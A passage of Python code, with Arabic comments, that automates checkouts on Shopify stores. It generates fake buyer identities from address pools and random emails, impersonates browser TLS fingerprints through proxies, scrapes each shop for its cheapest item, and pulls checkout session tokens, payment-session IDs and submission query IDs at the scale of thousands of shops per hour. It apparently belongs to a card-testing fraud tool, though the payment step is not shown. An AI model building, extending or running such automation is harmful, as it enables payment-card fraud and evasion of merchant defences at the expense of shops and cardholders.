        Address("charles", "martinez", "Bahnhofstrasse 1", "", "Zug", "CH", "ZG", "6300", "+41212349461", "gmail.com"),
    ],
    "AT": [
        Address("james", "smith", "Stephansplatz 1", "", "Wien", "AT", "9", "1010", "+431234560119", "gmail.com"),
        Address("john", "johnson", "Hauptplatz 1", "", "Graz", "AT", "6", "8010", "+431234566952", "gmail.com"),
        Address("robert", "williams", "Hauptplatz 1", "", "Linz", "AT", "4", "4020", "+431234564083", "gmail.com"),
        Address("michael", "brown", "Getreidegasse 1", "", "Salzburg", "AT", "5", "5020", "+431234568685", "gmail.com"),
        Address("william", "jones", "Maria-Theresien-Strasse 1", "", "Innsbruck", "AT", "7", "6020", "+431234565884", "gmail.com"),
        Address("david", "garcia", "Hauptplatz 1", "", "Klagenfurt", "AT", "2", "9020", "+431234565098", "gmail.com"),
        Address("richard", "miller", "Hauptplatz 1", "", "St. Polten", "AT", "3", "3100", "+431234564745", "gmail.com"),
        Address("joseph", "davis", "Hauptplatz 1", "", "Eisenstadt", "AT", "1", "7000", "+431234560952", "gmail.com"),
        Address("thomas", "rodriguez", "Mariahilfer Strasse 1", "", "Wien", "AT", "9", "1060", "+431234563306", "gmail.com"),
        Address("charles", "martinez", "Hauptplatz 1", "", "Villach", "AT", "2", "9500", "+431234567804", "gmail.com"),
    ],
    "JP": [
        Address("james", "smith", "1-1-1 Marunouchi", "", "Tokyo", "JP", "13", "100-0005", "+81312341243", "gmail.com"),
        Address("john", "johnson", "1-1-1 Umeda", "", "Osaka", "JP", "27", "530-0001", "+81312345284", "gmail.com"),
        Address("robert", "williams", "1-1-1 Sannomaru", "", "Nagoya", "JP", "23", "460-0001", "+81312348523", "gmail.com"),
        Address("michael", "brown", "1-1-1 Chuo", "", "Sapporo", "JP", "01", "060-0001", "+81312345135", "gmail.com"),
        Address("william", "jones", "1-1-1 Shimogyo", "", "Kyoto", "JP", "26", "600-8000", "+81312342477", "gmail.com"),
        Address("david", "garcia", "1-1-1 Naka", "", "Yokohama", "JP", "14", "231-0005", "+81312341097", "gmail.com"),
        Address("richard", "miller", "1-1-1 Chuo", "", "Kobe", "JP", "28", "650-0001", "+81312346210", "gmail.com"),
        Address("joseph", "davis", "1-1-1 Kokubun", "", "Sendai", "JP", "04", "980-0001", "+81312347473", "gmail.com"),
        Address("thomas", "rodriguez", "1-1-1 Hakata", "", "Fukuoka", "JP", "40", "810-0001", "+81312344611", "gmail.com"),
        Address("charles", "martinez", "1-1-1 Naka", "", "Hiroshima", "JP", "34", "730-0001", "+81312345338", "gmail.com"),
    ],
    "SG": [
        Address("james", "smith", "1 Raffles Place", "", "Singapore", "SG", "01", "048616", "+6561239824", "gmail.com"),
        Address("john", "johnson", "2 Orchard Turn", "", "Singapore", "SG", "05", "238801", "+6561238814", "gmail.com"),
        Address("robert", "williams", "1 Marina Blvd", "", "Singapore", "SG", "01", "018989", "+6561239420", "gmail.com"),
        Address("michael", "brown", "10 Bayfront Ave", "", "Singapore", "SG", "01", "018956", "+6561235749", "gmail.com"),
        Address("william", "jones", "1 Fullerton Rd", "", "Singapore", "SG", "04", "049213", "+6561234167", "gmail.com"),
        Address("david", "garcia", "80 Airport Blvd", "", "Singapore", "SG", "17", "819642", "+6561234280", "gmail.com"),
        Address("richard", "miller", "1 Esplanade Dr", "", "Singapore", "SG", "03", "038981", "+6561239302", "gmail.com"),
        Address("joseph", "davis", "3 Temasek Ave", "", "Singapore", "SG", "03", "039190", "+6561235980", "gmail.com"),
        Address("thomas", "rodriguez", "1 Harbourfront Walk", "", "Singapore", "SG", "09", "098585", "+6561239647", "gmail.com"),
        Address("charles", "martinez", "2 Jurong East St 21", "", "Singapore", "SG", "22", "609601", "+6561233872", "gmail.com"),
    ],
    "AE": [
        Address("james", "smith", "Sheikh Zayed Road 1", "", "Dubai", "AE", "DU", "00000", "+97122348337", "gmail.com"),
        Address("john", "johnson", "Corniche Road 1", "", "Abu Dhabi", "AE", "AZ", "00000", "+97122340041", "gmail.com"),
        Address("robert", "williams", "Al Majaz Waterfront 1", "", "Sharjah", "AE", "SH", "00000", "+97122345811", "gmail.com"),
        Address("michael", "brown", "Sheikh Humaid Bin Rashid St 1", "", "Ajman", "AE", "AJ", "00000", "+97122341646", "gmail.com"),
        Address("william", "jones", "Hamad Bin Abdulla Rd 1", "", "Fujairah", "AE", "FU", "00000", "+97122344908", "gmail.com"),
        Address("david", "garcia", "Al Qawasim Corniche 1", "", "Ras Al Khaimah", "AE", "RK", "00000", "+97122342713", "gmail.com"),
        Address("richard", "miller", "King Faisal St 1", "", "Umm Al Quwain", "AE", "UQ", "00000", "+97122340545", "gmail.com"),
        Address("joseph", "davis", "Jumeirah Beach Rd 1", "", "Dubai", "AE", "DU", "00000", "+97122346768", "gmail.com"),
        Address("thomas", "rodriguez", "Khalifa St 1", "", "Abu Dhabi", "AE", "AZ", "00000", "+97122349948", "gmail.com"),
        Address("charles", "martinez", "Al Rigga Rd 1", "", "Dubai", "AE", "DU", "00000", "+97122345863", "gmail.com"),
    ],
}

SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ['james', 'john', 'robert', 'michael', 'william', 'david', 'richard', 'joseph', 'thomas', 'charles', 'daniel', 'matthew', 'anthony', 'mark', 'donald', 'steven', 'paul', 'andrew', 'joshua', 'kenneth', 'kevin', 'brian', 'george', 'edward', 'ronald', 'timothy', 'jason', 'jeffrey', 'ryan', 'jacob', 'mary', 'patricia', 'jennifer', 'linda', 'elizabeth', 'barbara', 'susan', 'jessica', 'sarah', 'karen', 'nancy', 'lisa', 'betty', 'margaret', 'sandra', 'ashley', 'kimberly', 'emily', 'donna', 'michelle', 'amanda', 'melissa', 'stephanie', 'rebecca', 'laura', 'sharon', 'cynthia', 'kathleen', 'amy', 'angela']
LAST_NAMES     = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez', 'anderson', 'taylor', 'thomas', 'moore', 'jackson', 'martin', 'lee', 'white', 'harris', 'clark', 'lewis', 'robinson', 'walker', 'young', 'allen', 'king', 'wright', 'scott', 'torres', 'nguyen', 'hill', 'flores', 'green', 'adams', 'nelson', 'baker', 'hall', 'rivera', 'campbell', 'mitchell', 'carter', 'roberts', 'gomez', 'phillips', 'evans', 'turner', 'diaz', 'parker', 'cruz', 'edwards']

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    """Return a random verified address for a 2-letter country code.
    Rotates through a pool of 10 real addresses whose city/zone/postal all match."""
    if country in COUNTRY_ADDRESSES:
        return random.choice(COUNTRY_ADDRESSES[country])
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return random.choice(COUNTRY_ADDRESSES[base])
    return random.choice(COUNTRY_ADDRESSES["US"])

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(random.choice(COUNTRY_ADDRESSES[code]))
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = PROFILE_UA.get(impersonate) or random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })
        if proxy_url:
            self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ──────────────────────── Step 0: cheapest product ───────────────────


import re
import json
from bs4 import BeautifulSoup
import time

_product_cache: Dict[str, tuple] = {}
_product_cache_lock = threading.Lock()
_PRODUCT_CACHE_TTL = 3600
_PRODUCT_CACHE_MAX = 5000  # bound the cache — purge expired + evict oldest when full

def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.01, max_price: float | None = None) -> Tuple[str, str, str, str]:
    """
    تجيب أرخص منتج في الموقع بسعر من min_price فما فوق (بدون حد أقصى)
    بتجيب كل صفحات /products.json بالتوازي وتختار أرخص واحد
    """
    from concurrent.futures import ThreadPoolExecutor

    if max_price is None:
        max_price = float('inf')

    now = time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
            return cached[:-1]

    best_price = float('inf')
    best_product = None
    limit = 250
    max_pages = 50

    def _pick(products):
        nonlocal best_price, best_product
        for p in products or []:
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price or price > max_price:
                    continue
                if price < best_price:
                    best_price = price
                    best_product = (
                        p.get("title", ""),
                        str(p.get("id", "")),
                        str(v.get("id", "")),
                        v.get("price", "")
                    )

    pool = [TLSClient(client.timeout, client.proxy_url) for _ in range(8)]

    def _fetch(p):
        url = f"{shop_url}/products.json?limit={limit}&page={p}"
        try:
            resp = pool[p % len(pool)].get(url, timeout=15)
        except Exception:
            return None, None
        if resp.status_code != 200:
            return resp.status_code, None
        try:
            return 200, resp.json().get("products", [])
        except Exception:
            return 200, None

    # ===== المحاولة الأولى: products.json (كل الصفحات بالتوازي) =====
    catalog_blocked = None
    try:
        p1_status, page1 = _fetch(1)
        if page1 is None and p1_status is not None and p1_status != 200:
            catalog_blocked = p1_status
        total_pages = 1
        if page1 is not None:
            if len(page1) >= limit:
                total_pages = max_pages
                try:
                    resp = pool[0].get(f"{shop_url}/products/count.json", timeout=10)
                    if resp.status_code == 200:
                        count = int((resp.json() or {}).get("count", 0) or 0)
                        if count > len(page1):
                            total_pages = max(2, min(-(-count // limit), max_pages))
                except Exception:
                    pass
            _pick(page1)
        else:
            total_pages = max_pages

        if total_pages > 1 and page1 is not None:
            next_page = 2
            while next_page <= total_pages:
                end = min(next_page + 7, total_pages)
                with ThreadPoolExecutor(max_workers=8) as ex:
                    batch = list(ex.map(_fetch, range(next_page, end + 1)))
                last_seen = False
                for p, (st, products) in zip(range(next_page, end + 1), batch):
                    if products is None:
                        continue
                    _pick(products)
                    if len(products) < limit:
                        last_seen = True
                if last_seen:
                    break
                next_page = end + 1
    except Exception as e:
        pass  # لو فشل products.json، نكمل بالطريقة التانية

    # Close the 8 scraping sub-sessions — each holds a libcurl handle + a
    # connection pool. Leaving them open leaks ~1-2MB + 8 FDs per checkout.
    for _c in pool:
        try:
            _c.close()
        except Exception:
            pass

    if catalog_blocked is not None:
        raise Exception(f"No available products at {shop_url} (catalog blocked: HTTP {catalog_blocked})")
    
    # ===== المحاولة الثانية: HTML Scraping =====
    if not best_product:
        try:
            # نجيب الصفحة الرئيسية
            resp = client.get(shop_url, timeout=15)
            if resp.status_code == 200:
                html_content = resp.text
                
                # نبحث عن product cards في الـ HTML
                # Shopify بيستخدم JSON داخل الـ HTML
                json_pattern = r'<script[^>]*id="[^"]*"[^>]*>(\{.*?\})</script>'
                json_matches = re.findall(json_pattern, html_content, re.DOTALL)
                
                for json_str in json_matches:
                    try:
                        data = json.loads(json_str)
                        # نبحث عن products في الـ JSON
                        products = _extract_products_from_html_json(data)
                        for title, product_id, variant_id, price in products:
                            price_float = float(price)
                            if min_price <= price_float <= max_price:
                                if price_float < best_price:
                                    best_price = price_float
                                    best_product = (title, product_id, variant_id, price)
                    except:
                        continue
                
                # لو مش لاقي، نجيب /collections/all
                if not best_product:
                    try:
                        resp = client.get(f"{shop_url}/collections/all", timeout=15)
                        if resp.status_code == 200:
                            html_content = resp.text
                            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
                            
                            for link in product_links[:20]:  # نجرب أول 20 منتج
                                if not link.startswith('http'):
                                    link = shop_url + link
                                
                                try:
                                    resp = client.get(link, timeout=15)
                                    if resp.status_code != 200:
                                        continue
                                    
                                    product_html = resp.text
                                    
                                    # نبحث عن السعر والـ variant
                                    price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', product_html)
                                    if not price_match:
                                        continue
                                    
                                    price = float(price_match.group(1))
                                    if price < min_price or price > max_price:
                                        continue
                                    
                                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', product_html)
                                    if not variant_match:
                                        variant_match = re.search(r'data-variant-id="(\d+)"', product_html)
                                    if not variant_match:
                                        continue
                                    
                                    variant_id = variant_match.group(1)
                                    
                                    product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', product_html)
                                    product_id = product_match.group(1) if product_match else ""
                                    
                                    title_match = re.search(r'"title"\s*:\s*"([^"]+)"', product_html)
                                    title = title_match.group(1) if title_match else "Product"
                                    
                                    if price < best_price:
                                        best_price = price
                                        best_product = (title, product_id, variant_id, str(price))
                                except:
                                    continue
                    except:
                        pass
        except Exception as e:
            pass
    
    if not best_product:
        if max_price == float('inf'):
            raise Exception(f"No available products at {shop_url}")
        raise Exception(f"No available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
    
    with _product_cache_lock:
        _product_cache[shop_url] = best_product + (time.time(),)
        # Bound the cache: purge expired entries on write, then evict oldest
        # (by timestamp) if still over the cap. Prevents unbounded growth when
        # churning through thousands of unique shops per hour.
        if len(_product_cache) > _PRODUCT_CACHE_MAX:
            expired = [k for k, v in _product_cache.items()
                       if now - v[-1] >= _PRODUCT_CACHE_TTL]
            for k in expired:
                _product_cache.pop(k, None)
            if len(_product_cache) > _PRODUCT_CACHE_MAX:
                oldest = sorted(
                    _product_cache.items(), key=lambda kv: kv[1][-1]
                )[:_PRODUCT_CACHE_MAX // 10]
                for k, _ in oldest:
                    _product_cache.pop(k, None)
    return best_product


def _extract_products_from_html_json(data: dict) -> List[Tuple[str, str, str, str]]:
    """استخراج المنتجات من JSON مضمّن في HTML"""
    results = []
    
    def extract(obj):
        if isinstance(obj, dict):
            # نبحث عن المنتجات
            if 'products' in obj:
                for p in obj['products']:
                    title = p.get('title', '')
                    product_id = str(p.get('id', ''))
                    for v in p.get('variants', []):
                        if v.get('available', False):
                            variant_id = str(v.get('id', ''))
                            price = v.get('price', '0')
                            results.append((title, product_id, variant_id, price))
            
            if 'product' in obj:
                p = obj['product']
                title = p.get('title', '')
                product_id = str(p.get('id', ''))
                for v in p.get('variants', []):
                    if v.get('available', False):
                        variant_id = str(v.get('id', ''))
                        price = v.get('price', '0')
                        results.append((title, product_id, variant_id, price))
            
            # نبحث في القيم
            for value in obj.values():
                extract(value)
        elif isinstance(obj, list):
            for item in obj:
                extract(item)
    
    extract(data)
    return results

# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers={
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    """Return every JS chunk path (newline-joined): modulepreload links + the
    importmap integrity keys. Shopify moved to hashed ES modules and keeps the
    persisted-query registry (Proposal/SubmitForCompletion/PollForReceipt) in a
    dynamically-imported negotiator chunk that only appears in the importmap."""
    paths = []
    seen = set()
    for tag in re.findall(r'<link\b[^>]*modulepreload[^>]*>', checkout_html):
        m = re.search(r'href="([^"]+\.js)"', tag)
        if m and m.group(1) not in seen:
            seen.add(m.group(1)); paths.append(m.group(1))
    mm = re.search(r'<script type="importmap">(.*?)</script>', checkout_html, re.S)
    if mm:
        for u in re.findall(r'"(/cdn/shopifycloud/checkout-web/assets/[^"]+\.js)"', mm.group(1)):
            if u not in seen:
                seen.add(u); paths.append(u)
    return "\n".join(shop_url + p for p in paths)

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

# ── Persisted-query id discovery (content-based) ──────────────────────
# The 2026 checkout build split the registry across ~250 code-split chunks
# named <chunk8hex>.<hash8>.js, and the three persisted operations are declared
# in *different* files. Discovery is content-based over every checkout-web bundle:
# filename-independent and order-agnostic, so it survives Shopify's minifier and
# chunk-naming changes (unlike the old exact-order id:"…",type:"…",name:"…" regex).

_OPERATION_NAMES = ("Proposal", "SubmitForCompletion", "PollForReceipt")

# Descriptor shape: {id:"<64hex>",type:"query"|"mutation",name:"Op",source:""}
# Key order and the trailing source field are both minifier-dependent, so the
# fields are matched independently inside a bounded window instead of as one
# ordered literal.
_PERSISTED_ID = r'''id\s*:\s*["\']([a-f0-9]{64})["\']'''
_OP_WINDOW = r'''\{[^{}]{0,400}?\}'''
# (?<![A-Za-z0-9_]) is required: the bundle also contains __typename:"Proposal",
# whose trailing "name:\"Proposal\"" would otherwise match a naive pattern.
_OP_NAME_TMPL = r'''(?<![A-Za-z0-9_])name\s*:\s*["\']%s["\']'''
# Whole-descriptor match, tried first: exact and cheap.
_OP_DESC = (r'''\{\s*id\s*:\s*["\']([a-f0-9]{64})["\']\s*,\s*'''
            r'''type\s*:\s*["\'](?:query|mutation)["\']\s*,\s*'''
            r'''name\s*:\s*["\']([^"\']+)["\']\s*,?\s*\}''')


def absolutize_asset_url(ref: str, shop_url: str) -> str:
    """Turn a possibly-relative asset reference into an absolute URL."""
    ref = (ref or "").strip()
    if ref.startswith("http://") or ref.startswith("https://"):
        return ref
    if ref.startswith("//"):
        return "https:" + ref
    return shop_url.rstrip("/") + ("" if ref.startswith("/") else "/") + ref


def extract_js_refs(checkout_html: str, shop_url: str) -> List[str]:
    """Every same-build checkout-web JS bundle referenced by the checkout page.

    Returns absolute URLs in document order, de-duplicated. Filename-independent:
    it does not care what the bundles are called.
    """
    text = html.unescape(checkout_html or "")
    out: List[str] = []
    seen = set()
    for m in re.finditer(r'''["\']([^"\']*\.m?js(?:\?[^"\']*)?)["\']''', text):
        ref = m.group(1)
        if "checkout-web" not in ref:
            continue
        url = absolutize_asset_url(ref, shop_url)
        if url not in seen:
            seen.add(url)
            out.append(url)
    return out


def extract_persisted_ids(js_body: str) -> Dict[str, str]:
    """Map operation name -> persisted-query id for one JS bundle.

    Returns every operation found (a bundle only declares a subset).
    """
    found: Dict[str, str] = {}
    if not js_body:
        return found
    for m in re.finditer(_OP_DESC, js_body):
        found.setdefault(m.group(2), m.group(1))
    for name in _OPERATION_NAMES:                      # order-agnostic fallback
        if name in found:
            continue
        pat = _OP_NAME_TMPL % name
        for blk in re.finditer(_OP_WINDOW, js_body):
            if not re.search(pat, blk.group(0)):
                continue
            idm = re.search(_PERSISTED_ID, blk.group(0))
            if idm:
                found[name] = idm.group(1)
                break
    return found


def extract_proposal_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("Proposal", "")


def extract_submit_for_completion_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("SubmitForCompletion", "")


def extract_poll_for_receipt_id(js_body: str) -> str:
    return extract_persisted_ids(js_body).get("PollForReceipt", "")


def merge_persisted_ids(into: Dict[str, str], found: Dict[str, str]) -> Dict[str, str]:
    """Union two id maps without overwriting existing entries."""
    for k, v in (found or {}).items():
        if v:
            into.setdefault(k, v)
    return into
def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""

def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
    return match.group(1) if match else ""

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_delivery_handle(proposal_body: str) -> str:
    patterns = [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        r'"handle"\s*:\s*"([a-f0-9\-]{20,})"',
    ]
    for p in patterns:
        match = re.search(p, proposal_body)
        if match:
            return match.group(1)
    return ""

# ── Currency → Country mapping (full port from app.go currencyToCountry) ──
CURRENCY_TO_COUNTRY = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "EUR": "DE", "AUD": "AU",
    "NZD": "NZ", "SGD": "SG", "HKD": "HK", "JPY": "JP", "CNY": "CN",
    "INR": "IN", "MXN": "MX", "BRL": "BR", "ARS": "AR", "CLP": "CL",
    "COP": "CO", "PEN": "PE", "VND": "VN", "THB": "TH", "IDR": "ID",
    "PHP": "PH", "MYR": "MY", "TWD": "TW", "KRW": "KR", "PKR": "PK",
    "BDT": "BD", "LKR": "LK", "NPR": "NP", "MMK": "MM", "KHR": "KH",
    "LAK": "LA", "MNT": "MN", "AFN": "AF", "IRR": "IR", "IQD": "IQ",
    "SYP": "SY", "LBP": "LB", "JOD": "JO", "SAR": "SA", "AED": "AE",
    "QAR": "QA", "KWD": "KW", "BHD": "BH", "OMR": "OM", "YER": "YE",
    "EGP": "EG", "SDG": "SD", "ETB": "ET", "KES": "KE", "UGX": "UG",
    "TZS": "TZ", "RWF": "RW", "ZMW": "ZM", "ZWL": "ZW", "MZN": "MZ",
    "NAD": "NA", "ZAR": "ZA", "BWP": "BW", "SZL": "SZ", "LSL": "LS",
    "MGA": "MG", "SCR": "SC", "MUR": "MU", "MVR": "MV", "SEK": "SE",
    "NOK": "NO", "DKK": "DK", "ISK": "IS", "CHF": "CH", "CZK": "CZ",
    "PLN": "PL", "HUF": "HU", "RON": "RO", "BGN": "BG", "HRK": "HR",
    "RSD": "RS", "BAM": "BA", "MKD": "MK", "ALL": "AL", "AMD": "AM",
    "AZN": "AZ", "GEL": "GE", "KZT": "KZ", "KGS": "KG", "TJS": "TJ",
    "TMT": "TM", "UZS": "UZ", "BYN": "BY", "UAH": "UA", "MDL": "MD",
    "RUB": "RU", "TRY": "TR", "ILS": "IL", "DZD": "DZ", "MAD": "MA",
    "TND": "TN", "LYD": "LY", "GMD": "GM", "GNF": "GN", "SLL": "SL",
    "LRD": "LR", "GHS": "GH", "NGN": "NG", "XOF": "SN", "XAF": "CM",
    "CDF": "CD", "AOA": "AO", "NIO": "NI", "HNL": "HN", "GTQ": "GT",
    "BZD": "BZ", "TTD": "TT", "JMD": "JM", "HTG": "HT", "BBD": "BB",
    "XCD": "AG", "BSD": "BS", "KYD": "KY", "BMD": "BM", "AWG": "AW",
    "BOB": "BO", "UYU": "UY", "PYG": "PY", "GYD": "GY", "SRD": "SR",
    "FJD": "FJ", "PGP": "PG", "SBD": "SB", "TOP": "TO", "WST": "WS",
    "VUV": "VU", "KPW": "KP", "MOP": "MO", "BND": "BN", "KID": "KI",
    "STN": "ST", "CVE": "CV", "MRU": "MR", "SOS": "SO", "DJF": "DJ",
    "ERN": "ER", "KMF": "KM", "BIF": "BI", "MWK": "MW",
}

_RE_CURRENCY_CART = re.compile(r'"currency"\s*:\s*"([A-Z]{3})"')

def fetch_shop_currency_sync(client, shop_url: str, headers=None) -> Tuple[str, str]:
    """
    Detect shop currency and resolve its country code.
    Tries /meta.json → /cart.js → fallback "USD"/"US". Mirrors app.go fetchCurrency.
    """
    def _apply(cur):
        return cur, CURRENCY_TO_COUNTRY.get(cur, "US")

    for path in ("/meta.json", "/cart.js"):
        try:
            resp = client.get(f"{shop_url}{path}", timeout=10)
            if resp and resp.status_code == 200:
                if path == "/meta.json":
                    cur = str((resp.json().get("currency") or "")).strip().upper()
                else:
                    m = _RE_CURRENCY_CART.search(resp.text)
                    cur = m.group(1).upper() if m else ""
                if len(cur) == 3:
                    return _apply(cur)
        except Exception:
            continue
    return "USD", "US"

# ── Gateway extraction (raw name straight from the site, no mapping) ──
_GATEWAY_PATTERNS = [
    re.compile(r'"paymentMethodIdentifier"\s*:\s*"[^"]*"\s*,\s*"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"name"\s*:\s*"([^"]+)"\s*,\s*"paymentMethodIdentifier"'),
    re.compile(r'"extensibilityDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"providerDisplayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentProvider"\s*:\s*\{"name"\s*:\s*"([^"]+)"'),
    re.compile(r'"gatewayName"\s*:\s*"([^"]+)"'),
    re.compile(r'"paymentGateway"\s*:\s*"([^"]+)"'),
    re.compile(r'"availablePaymentLines".*?"displayName"\s*:\s*"([^"]+)"'),
]

def extract_gateway_name(*bodies: str) -> str:
    """
    Return the real payment gateway name exactly as the shop reports it
    (no humanizer table). Falls back to 'Shopify Payments'.
    """
    for body in bodies:
        if not body:
            continue
        for pat in _GATEWAY_PATTERNS:
            m = pat.search(body)
            if m:
                name = m.group(1).strip()
                if name:
                    return name
    return "Shopify Payments"

def extract_delivery_from_proposal(proposal_json: str) -> Tuple[str, str]:
    """
    Robust delivery extraction used by the reference checker: read the
    seller proposal's FilledDeliveryTerms and pick the CHEAPEST
    availableDeliveryStrategies handle + its amount. Returns ("", "") when
    the proposal has no shippable delivery (digital stores).
    """
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        delivery = seller.get("delivery", {}) or {}
        if delivery.get("__typename") == "FilledDeliveryTerms":
            lines = delivery.get("deliveryLines") or []
            if lines:
                strats = lines[0].get("availableDeliveryStrategies") or []
                if strats:
                    best = min(
                        strats,
                        key=lambda s: float(s.get("amount", {}).get("value", {}).get("amount", 999999)))
                    handle = best.get("handle", "")
                    amount = best.get("amount", {}).get("value", {}).get("amount", "")
                    return str(handle), str(amount) if amount is not None else ""
    except Exception:
        pass
    return "", ""
